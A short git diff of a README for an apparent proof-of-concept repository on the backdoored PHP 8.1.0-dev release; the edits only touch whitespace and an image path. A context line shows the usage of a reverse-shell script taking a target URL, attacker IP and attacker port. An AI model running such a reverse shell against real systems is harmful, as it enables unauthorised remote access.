@@ -14,7 +14,7 @@ The original code was restored after the issue was discovered, but then tampered
 ## Summary
 
 1- The Story   
-2- POC Script
+2- POC Script    
 3- Reverse Shell
   
 
@@ -97,7 +97,7 @@ Usage:
 └─$ python3 revshell_php_8.1.0-dev.py <target URL> <attacker IP> <attacker PORT>
 ```
 
-![docs/revshell-script.png](docs/revshell-script.png "docs/revshell-script.png")
+![revshell-script.png](revshell-script.png "revshell-script.png")
 
 
 
